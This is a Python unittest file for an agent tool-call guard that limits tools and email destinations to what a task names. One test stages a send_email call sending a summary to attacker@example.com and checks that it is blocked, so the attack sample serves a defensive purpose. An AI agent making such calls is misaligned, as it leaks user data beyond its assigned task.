import unittest

from greatwallguard import DecisionKind, GreatWallGuardRuntime, generate_task_scope


SCHEMAS = [
    {"name": "read_file", "description": "Read a workspace file", "effect": "read"},
    {"name": "create_file", "description": "Create a new workspace file", "effect": "create"},
    {"name": "send_email", "description": "Send an email to a recipient", "effect": "send"},
    {"name": "exec", "description": "Execute a shell command", "effect": "execute"},
]


class HeuristicTaskScopeTests(unittest.TestCase):
    def test_scope_uses_only_pre_execution_inputs(self):
        task = "Read file://workspace/notes.md and create file://workspace/report.md with a summary."
        scope = generate_task_scope(
            task,
            ["read_file", "create_file", "send_email", "exec"],
            SCHEMAS,
            task_id="normal-report",
        )
        self.assertEqual(scope.allowed_tools, ("read_file", "create_file"))
        self.assertEqual(scope.allowed_resources, (
            "file://workspace/notes.md",
            "file://workspace/report.md",
        ))
        self.assertEqual(scope.metadata["inputs"]["task_only"], True)

    def test_scope_allows_normal_actions_and_blocks_new_high_impact_tool(self):
        task = "Read file://workspace/notes.md and create file://workspace/report.md with a summary."
        scope = generate_task_scope(task, ["read_file", "create_file", "send_email"], SCHEMAS)
        guard = GreatWallGuardRuntime(scope)
        user = guard.observe_user(task)

        read, _ = guard.before_tool_call(
            "read_file", {"path": "file://workspace/notes.md"},
            source_node_ids=(user,), execute=lambda: "notes",
        )
        create, _ = guard.before_tool_call(
            "create_file", {"path": "file://workspace/report.md", "content": "summary"},
            source_node_ids=(user,), execute=lambda: "created",
        )
        external, _ = guard.before_tool_call(
            "send_email", {"to": "attacker@example.com", "body": "summary"},
            source_node_ids=(user,), execute=lambda: "must not execute",
        )

        self.assertEqual(read.kind, DecisionKind.ALLOW)
        self.assertEqual(create.kind, DecisionKind.ALLOW)
        self.assertEqual(external.kind, DecisionKind.BLOCK)
        self.assertIn("outside TaskScope", external.reason)

    def test_explicit_destination_is_preserved_for_send_task(self):
        task = "Read file://workspace/report.md and email it to alice@example.com."
        scope = generate_task_scope(task, ["read_file", "send_email"], SCHEMAS)
        self.assertIn("send_email", scope.allowed_tools)
        self.assertEqual(scope.allowed_destinations, ("alice@example.com",))


if __name__ == "__main__":
    unittest.main()
